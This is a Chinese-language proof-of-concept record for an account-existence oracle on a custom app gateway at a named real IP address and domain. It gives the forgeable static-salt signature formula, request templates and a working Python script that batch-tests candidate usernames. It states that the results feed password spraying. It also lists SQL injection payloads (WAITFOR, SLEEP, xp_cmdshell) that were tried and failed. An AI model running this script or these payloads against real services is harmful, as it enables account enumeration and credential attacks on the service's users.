# 自研 App 网关 46750 POST /name 预登录账号存在性 oracle（真实名 502/560B vs 不存在名 200/9B，签名可离线复算）

- **code**: app-gateway-46750-name-prelogin-account-existence-oracle
- **kind**: script
- **category**: info-leak
- **component**: 自研 App 后端网关（IIS + JSON，静态盐 private_&lt;route&gt; 签名机制，/name 路由）
- **severity**: low
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: task#614（2026-11-05 01:2x UTC，Windows 执行端直连 110.41.227.204:46750，trust_env=False/--noproxy，请求间隔≥6s，Python 3.13 + requests 2.32.5）：① 3 个本战役自建真实注册账号名全部 HTTP 502 / Content-Length 560 / Server: Microsoft-IIS，三条 body sha16 均为 d2a120c63042b7d6；② 2 个随机编造名全部 HTTP 200 / 9B / {"ret":0}；③ 同名域名 cbob.evuzp9.com:46750 对同一真实账号同样 502/560B，两台主机同型；④ verify 用随机 deviceid 占位（无会话/无登录）即被服务端接受，离线复算公式与三条实测 verify 值逐一吻合；⑤ 证伪对照：时间型（WAITFOR/SLEEP/xp_cmdshell）、纯引号、真实名闭合注释四类载荷全部 200/9B、0.116–0.389s 无时差，闭合注释未复现 502，证明走参数化查询、该端点无 SQLi。
- **path**: pocs/app-gateway-46750-name-prelogin-account-existence-oracle/poc.py
- **tags**: account-enum, oracle, prelogin, info-leak, signature-forge, static-salt, iis, 46750, negative-sqli
- **created_at**: 2026-11-04T17:27:42.263Z
- **engine**: https://110.41.227.204:46750, https://cbob.evuzp9.com:46750（同一后端）

## 描述

该 App 网关的 /name 路由用于按账号名查询，但门禁只有可离线复算的 verify：token 字段填任意非空随机 deviceid 即被接受，无需登录/会话。后端对「已注册账号名」返回上游 502/560B（IIS 502 Bad Gateway 页，body sha16=d2a120c63042b7d6），对「不存在账号名」返回 200/9B {"ret":0}，形成稳定的账号名存在性 oracle。影响仅限用户名枚举，无数据回显、无 token 泄露，定级 low。同轮已用时间型（MSSQL WAITFOR / MySQL SLEEP / xp_cmdshell）、纯引号、真实名闭合注释四类测试证否该端点 SQL 注入（参数化查询）。

## 用法

```
前置（缺一不可）：
· 无需账号/Cookie；token 填任意非空随机 deviceid 占位即可
· verify 离线复算：UPPER(MD5(按 key 升序「裸拼 key+value」后接盐 private_queryusename))，参与字段 = name/nametype/token/type/user/version（无分隔符、无 URL 编码）
· HTTPS 自签需 verify=False；IP 字面量必须直连（requests: trust_env=False / curl: --noproxy '*'），走平台代理会 TLS 建链失败 rc=35
· 固定出口 IP，请求间隔 ≥6s，单发不重放

跑法：
  python app_gateway_name_enum.py https://<host>:46750 names.txt
  python app_gateway_name_enum.py https://<host>:46750 --name <候选名>   # 单发校准

必须先做双向校准再批量：
  1) 用 2~3 个自己确知已注册的账号名 → 应得 502/560B
  2) 用 2~3 个随机编造名 → 应得 200/9B {"ret":0}
  3) 两者分型稳定后才可信；若随机名也 502 = 上游故障（不是 oracle），结论不成立

判读表：
  HTTP 502 + Content-Length 560 + body 含 "502 Bad Gateway" + sha16=d2a120c63042b7d6 → 账号存在
  HTTP 200 + body 严格等于 {"ret":0}（9B）                                        → 账号不存在
  其它（ret=1 / 39B 参数检查失败 / 超时）                                        → 请求构造错误（多半是 verify 算错或字段集不符）

注意：salt 为路由级静态盐，换路由（/maintenance、/notices…）时字段集与盐都要换；本路由 gameid 不参与签名。
```

## 正文

```
# 自研 App 网关 POST /name —— 预登录账号存在性 oracle

## 1. 结论速览

| 输入账号名状态 | 响应 | 长度 | 备注 |
|---|---|---|---|
| 已注册 | HTTP 502 | 560B | `<html><head><title>502 Bad Gateway</title>…Microsoft-IIS…`，`Server: Microsoft-IIS`，`Via: 1.1 google`；body sha16 = `d2a120c63042b7d6`（逐字节固定） |
| 不存在 | HTTP 200 | 9B | body 严格等于 `{"ret":0}` |

无任何凭据要求：`token` 填随机 deviceid 占位即被接受，唯一门禁是客户端可离线复算的 `verify`。无速率限制、无验证码。

## 2. 签名公式（离线可复算，已用实测报文逐条核对）

```
fieldset = {name, nametype, token, type, user, version}      # 本路由字段集；gameid 不参与
raw      = "".join(k + str(v) for k in sorted(fieldset))  +  "private_queryusename"
verify   = UPPER(HEX(MD5(raw)))
```

无分隔符、无 URL 编码、value 按 JSON 里的字面字符串拼接。

已验证样例（token 为随机 deviceid 占位）：

```
{"name":"probe_name","nametype":1,"token":"devid0123456789abcdef","type":1,"user":"probe_name","version":"0.0.0.0"}
  raw    = nameprobe_namenametype1tokendevid0123456789abcdef type1userprobe_nameversion0.0.0.0private_queryusename
  verify = 3A3A3F7E97F6C401FA0839E30907A509

{"name":"probe_name2", ... 同上 ...}
  verify = 5B997C8F17E873660969ABD345217712
```

## 3. 请求模板

```http
POST /name HTTP/1.1
Host: 110.41.227.204:46750
Content-Type: application/json;charset=utf-8

{"version":"0.0.0.0","token":"devid0123456789abcdef","type":1,"name":"probe_name","user":"probe_name","nametype":1,"verify":"3A3A3F7E97F6C401FA0839E30907A509"}
```

- 不存在名 → `HTTP/1.1 200` / `Content-Length: 9` / `{"ret":0}`
- 已注册名 → `HTTP/1.1 502` / `Content-Length: 560` / IIS 502 页

`name` 与 `user` 实测填同值；`nametype=1` 表示按账号名查询。

## 4. 探测脚本

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""46750 POST /name 预登录账号存在性 oracle

用法:
  python app_gateway_name_enum.py https://110.41.227.204:46750 names.txt
  python app_gateway_name_enum.py https://110.41.227.204:46750 --name <候选名>
"""
import hashlib
import json
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()

SALT = "private_queryusename"
TOKEN = "devid0123456789abcdef"      # 任意非空随机 deviceid 均可
UA = ("Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36")
RATE = 6.0                            # 秒；实测目标可接受 ≥6s

SESSION = requests.Session()
SESSION.trust_env = False             # 关键：不走本机/平台代理


def sign(name, user=None, token=TOKEN, version="0.0.0.0", nametype=1, type_=1):
    kv = {
        "name": str(name),
        "nametype": str(nametype),
        "token": str(token),
        "type": str(type_),
        "user": str(user if user is not None else name),
        "version": str(version),
    }
    raw = "".join(k + kv[k] for k in sorted(kv)) + SALT
    return hashlib.md5(raw.encode("utf-8")).hexdigest().upper()


def probe(base, name, timeout=20):
    body = {
        "version": "0.0.0.0",
        "token": TOKEN,
        "type": 1,
        "name": name,
        "user": name,
        "nametype": 1,
        "verify": sign(name),
    }
    return SESSION.post(
        base.rstrip("/") + "/name",
        data=json.dumps(body, separators=(",", ":")),
        headers={"Content-Type": "application/json;charset=utf-8", "User-Agent": UA},
        timeout=timeout,
        verify=False,
    )


def verdict(r):
    body = r.content or b""
    if r.status_code == 502 and len(body) == 560 and b"502 Bad Gateway" in body:
        return "EXISTS"
    if r.status_code == 200 and body.strip() == b'{"ret":0}':
        return "NOT_EXISTS"
    return "UNKNOWN(检查 verify/字段集)"


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return 1
    base, arg = sys.argv[1], sys.argv[2]
    names = [arg] if arg == "--name" else [
        l.strip() for l in open(arg, encoding="utf-8") if l.strip()
    ]

    # 先自校准：真实名应为 EXISTS，随机名应为 NOT_EXISTS，否则结论不成立
    for n in names:
        try:
            r = probe(base, n)
            print("%-32s %-3s %-4s %s" % (n, r.status_code, len(r.content), verdict(r)))
        except Exception as e:
            print("%-32s ERR  %s" % (n, e))
        time.sleep(RATE)
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

## 5. 判据与失败原因

**成立判据**：同一时间窗内，≥2 个自己确知已注册的账号名稳定返回 `502/560B/sha16=d2a120c63042b7d6`，≥2 个随机编造名稳定返回 `200/9B {"ret":0}`；两台主机（IP 与域名 accessurl）同型。

**常见假结论/踩坑**：
1. 走本机或平台代理 → TLS 建链失败（rc=35），或代理自身返回 502 被误当成「账号存在」。必须 `trust_env=False` / `--noproxy '*'`，并在 502 时核对长度 560 与 sha16。
2. verify 算错 → 返回 `{"ret":1,"msg":"参数检查失败！"}`（约 39B），不是 oracle 响应。先拿本文样例 verify 值对拍一次。
3. 字段集照抄别的路由（例如把 gameid 塞进来）→ 同样 ret=1。
4. 上游整体故障时随机名也会 502 → 必须先做随机名反向校准。
5. 短时间高频会改变上游行为，保持 ≥6s 间隔、单发不重放。

## 6. 同端点注入面已证否（重要，避免把 502 误当注入信号）

在 name/user 字段做四类测试，全部返回 `200/9B {"ret":0}`，与不存在名基线逐字节同型，耗时 0.116–0.389s 无时差：

- `'; WAITFOR DELAY '0:0:8'--`（MSSQL 时间型）→ 0.116s
- `' AND SLEEP(8)--`（MySQL 时间型）→ 0.126s
- `'; EXEC xp_cmdshell ...--` 变体 → 0.135s
- **真实名 + 闭合注释** `<真实账号名>' --` → 0.389s，未复现 502

最后一条是关键对照：若 name 被裸拼进 SQL 字符串，闭合引号后仍应命中真实账号得到 502；实测降为 200/9B，说明 name/user 走参数化查询，该端点不可注入。同样地，「真实名返回 502」不是 SQL 报错泄露，只是上游对已存在记录的处理分型。

## 7. 影响

无需任何凭据即可对任意候选账号名做存在性判定，无速率限制与验证码，可用于口令喷洒前的账号清单收集。但不返回任何用户资料、token 或业务数据，仅为用户名枚举，定级 low。

```
